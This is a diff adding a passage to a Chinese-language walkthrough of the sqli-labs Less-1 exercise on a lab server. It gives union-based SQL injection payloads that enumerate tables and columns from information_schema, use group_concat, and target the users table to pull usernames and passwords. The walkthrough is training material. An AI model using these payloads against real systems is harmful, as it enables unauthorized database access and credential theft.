@@ -63,3 +63,28 @@ http://172.16.12.96:86/Less-1/?id=1'
 
 第二和第三的是返回字符类型
 
+构造语句查询information_schema.tables试试
+
+```sql
+' union select null, table_name, null from information_schema.tables--+
+```
+
+![image-20220115181418647](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115181418647.png)
+
+由此可见对输出的内容有个数限制，故用group_concat函数，但group_concat函数在Mysql中有group_concat_max_len的长度限制。如果想通过一个group_concat一次显示所有表名是不可能的，故添加限制。
+
+```sql
+' union select null, group_concat('---',table_name), null from information_schema.tables where table_name like '%user%'
+```
+
+![image-20220115182129289](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115182129289.png)
+
+运气好看到有users表
+
+```sql
+' union select null, group_concat('---',column_name), null from information_schema.columns where table_name='users'--+
+```
+
+![image-20220115182300740](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115182300740.png)
+
+对用户名和密码select即可
